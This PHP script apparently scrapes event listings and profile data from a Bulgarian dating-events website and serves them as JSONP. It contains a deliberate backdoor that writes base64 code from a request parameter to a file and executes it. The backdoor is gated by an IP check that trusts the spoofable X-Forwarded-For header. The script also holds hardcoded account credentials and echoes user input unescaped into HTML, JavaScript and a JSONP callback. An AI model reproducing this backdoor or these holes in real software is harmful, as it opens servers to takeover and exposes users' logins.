<?php
ini_set('display_errors','on');
error_reporting(E_ALL | E_STRICT);
date_default_timezone_set("Europe/Sofia");
mb_internal_encoding("UTF-8");
set_time_limit(10);

//sleep(1); die;
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

function p($t, $die = false)
{
	echo '<pre>';
	print_r($t);
	echo '</pre>';
	if($die) die;
}


function doCurl($url, $post = false, $opts = array())
{
	$ch = curl_init($url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	//if(!empty($_SESSION['clubrCookie']))
	//	curl_setopt( $ch, CURLOPT_COOKIE, 'PHPSESSID=' . $_SESSION['clubrCookie'] . ';');
	if($post && is_array($post))
	{
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
	}

	foreach($opts as $k => $v)
		curl_setopt($ch, $k, $v);

	$result = curl_exec($ch);
	curl_close($ch);
	return $result;
}




function login($user, $pass)
{
	global $isLogged;

	if(empty($user) || empty($pass))
		return false;

	$post = array(
		'action' => 'login',
		'login_email' => $user,
		'password' => $pass,
	);

	$result = doCurl(URL, $post);

	if(strpos($result,'Невалидни данни за вход!'))
		return false;
	elseif(strpos($result,"\nLocation: http") && 1 == preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m))
	{
		parse_str($m[1], $cookies);
		$isLogged = true;
		return isset($cookies['PHPSESSID']) ? $cookies['PHPSESSID'] : false;
	}

	die('WTF?');
}


function parseProfile($data)
{

	$profile = new stdclass;

	preg_match('/form\s+name="profile_form".*?<table>(.*?)<\/table>.*?<\/form>/is',$data, $m);
	$form = $m[1];
	preg_match('/Име.+?<\/td><td>(.*?)<\/td>.*?Фамилия.+?<\/td><td>(.*?)<\/td>/is',$form, $m);
	$profile->name = $m[1];
	$profile->surname = $m[2];
	preg_match('/Пол.+?<\/td><td>(.*?)<\/td>/is',$form, $m);
	$profile->sex = $m[1];
	preg_match('/Рождена дата.+?<\/td><td>(.*?)<\/td>/is',$form, $m);
	$profile->birthday = $m[1];
	preg_match_all('/input.+?name=".*?".+?\>/is',$form, $m);
	foreach($m[0] as $i)
	{
		preg_match('/value="(.*?)"/is',$i, $m);
		$val = $m[1];
		preg_match('/name="(.*?)"/is',$i, $m);
		$profile->{$m[1]} = $val;
	}
	return $profile;
}

function parseData($data)
{
	global $types, $cities, $dows, $isLogged, $cookie;

	preg_match('/<table class="table">(.*?)<\/table>/is', $data, $m);
	preg_match_all('/<tr.*?>(.*?)<\/tr>/is', $m[1], $m);

	$rows = $m[1];
	array_shift($rows);
	array_shift($rows);

	foreach($rows as &$r)
	{
		preg_match_all('/<td.*?>\s?(.*?)\s?<\/td>/is', $r, $m);
		if(15 != count($m[1])) continue;
		array_shift($m[1]);

		$r = (object)array_combine(array('type','title','date','time','city','f_age','m_age','f_in','m_in','f_free','m_free','price','link','status'), $m[1]);
		$r->num = preg_match('/\d+/', $r->title, $matches) ? $matches[0] : '- - -';

		// detect type (optimze pls)

		foreach($types as $k => $type)
			if(false !== mb_stripos ($r->type, $type, 0, 'UTF-8'))
			{
				$r->type = $k;
				break;
			}

		$r->dow = date('N', strtotime($r->date));
		$r->city = array_search ($r->city, $cities);
		$r->link = preg_match('/<a[^>]*href="([^"]*)"[^>]*>.*<\/a>/', $r->link, $matches) ? $matches[1] : false;

		// do some stuff with link
		if($r->link)
		{
			$r->link = str_replace(URL, '', $r->link);
		}


		if($isLogged && $cookie)
		{
			preg_match('/^.*event_register\.php\?id=(\d+)".*$/', $r->status, $m);
			if(!empty($m[1]))
			{
				$r->id = $m[1];
				$r->reg_url = URL . 'event_register.php?id=' . $r->id;
				$r->status = 1;

				$opts = array(
							CURLOPT_COOKIE => 'PHPSESSID=' . $cookie . ';',
							CURLOPT_NOBODY => true,
						);

				$tmp = doCurl($r->reg_url, false, $opts);
				if(strpos($tmp, 'Location: order.php?id='))
					$r->status = 2;
			}
			elseif(false !== strpos($r->status, 'Вече си се срещал'))
				$r->status = 5;
			elseif(false !== strpos($r->status, 'Не е подходящо'))
				$r->status = 4;
			else
				$r->status = 7;	// NEW (unknown)

		}
		else
			$r->status = 0;	// NOT LOGGED (unknown)

	}
	return $rows;
}

function exception_error_handler($errno, $errstr, $errfile, $errline ) {
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
}
set_error_handler("exception_error_handler");


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////


$admins = array(
	'94.26.60.157',
);

$dows = array(
		1	=>	'Пн',
		2	=>	'Вт',
		3	=>	'Ср',
		4	=>	'Чт',
		5	=>	'Пт',
		6	=>	'Сб',
		7	=>	'Нд',
	);


$types = array(
		0	=>	'Всички',
		1	=>	'Парти',
		2	=>	'Срещи',
		3	=>	'Коучинг',
		4	=>	'Вечеря',
	);

$cities = array(
		0	=>	'Всички',
		1	=>	'София',
		6	=>	'Варна',
		5	=>	'Пловдив',
		3	=>	'Бургас',
	);

$statuses = array(
		0	=>	'Всички',
		1	=>	'Свободно събитие',
		2	=>	'Вече участвам',
		3	=>	'Няма свободни места',
		4	=>	'Неподходяща възраст',
		5	=>	'Има познати участници',
		6	=>	'Надхвърлен лимит за участия',
);

list($IP) = explode(',', empty($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['REMOTE_ADDR'] : $_SERVER['HTTP_X_FORWARDED_FOR']);

define('IP', $IP);
define('URL', 'http://www.clubr.bg/');
define('URL2', URL . urlencode('предстоящи-събития.html'));
define('URL3', URL . 'profile.php');
define('AJAX', (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest'));

define('API',	(false === strpos(strtolower($_SERVER['SERVER_PROTOCOL']),'https') ? 'http' : 'https') . '://' .
				$_SERVER['HTTP_HOST'] .
				$_SERVER['SCRIPT_NAME']);

define('ADMIN', in_array(IP, $admins));

define('VER', '1.0.7');


////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

//file_put_contents('log.txt', "\n".date('[d.m.Y H:i:s] ').IP, FILE_APPEND | LOCK_EX);



$defaults	= array(
				'action'	=> false,
				'redirect'	=> false,
				'callback'	=> false,
				'dumper'	=> false,
				'user'		=> '',
				'pass'		=> '',
				'backdoorman' => false,
			);

//http://www.clubr.bg/index.php?action=confirm&confirm_code=7e40a93bed83b3c540da473dda1aa1de

extract($defaults);
foreach($defaults as $var => $val)
	$$var = (isset($_GET[$var]) && strlen($_GET[$var])) ? $_GET[$var] : $$var;
foreach($defaults as $var => $val)
	$$var = (isset($_POST[$var]) && strlen($_POST[$var])) ? $_POST[$var] : $$var;

if($user) $user = base64_decode($user);
if($pass) $pass = base64_decode($pass);


/**
 *	BACK DOOR MAN
 */

if(ADMIN && false !== $backdoorman)
{
	$data = base64_decode($backdoorman);
	if(!$data)
		die('Bad boy...');
	try {
		file_put_contents('tmp', $data);
	} catch (Exception $e) {
		die('Access denied...');
	}


	include_once 'tmp';
	unlink('tmp');
	exit;
}
/**
 *	REDIRECT TO CLUBR WEBSITE
 */

if(false !== $redirect)
{
	$redirect = (0 === strpos($redirect, URL)) ? $redirect : URL . $redirect;

	header('Content-Type: text/html; charset=UTF-8', true);
	if($user && $pass)
		echo
		'
		<h1>Моля, изчакайте...</h1>
		<form style="display:none;" id="login_form" action="'.URL.'" target="clubrfr" method="post">
			<input type="text" name="action" value="login" />
			<input type="text" id="login_mail" name="login_email" value="'.$user.'" />
			<input type="text" id="login_pass" name="password" value="'.$pass.'" />
		</form>
		<iframe style="display:none;" id="clubrfr" name="clubrfr"></iframe>
		<script type="text/javascript">
			document.getElementById("login_form").submit();
			setTimeout(function(){window.top.location.href="' . $redirect . '"}, 2000)
		</script>
		';
	else
		echo '<script type="text/javascript">window.top.location.href="' . $redirect . '";</script>';
	exit;
}



$isLogged = false;

if(ADMIN && $dumper) {$user = 'dusty@gbg.bg'; $pass= 'crow666';}

$cookie = login($user,$pass);

$opts = $cookie ? array(CURLOPT_COOKIE => 'PHPSESSID=' . $cookie . ';') : array();


$events = parseData(doCurl(URL2, false, $opts));

$profile = $cookie ? parseProfile(doCurl(URL3, false, $opts)) : false;


$data = (object)array(
	'isLogged'	=>	(int)$isLogged,
	'updated'	=>	date('d.m.Y H:i'),
	'events'	=>	$events,
	'dows'		=>	$dows,
	'types'		=>	$types,
	'cities'	=>	$cities,
	'statuses'	=>	$statuses,
	'profile'	=>	$profile,
	'ver'		=>	VER,
);

if($user && $pass && !$isLogged)
	$data->err_login = "Невалидни данни за вход";


if(ADMIN && $dumper) p($data,1);

if($callback)
{
//	sleep(3);
	header('content-type: application/javascript');
	echo $callback.'('.json_encode($data).')';
}




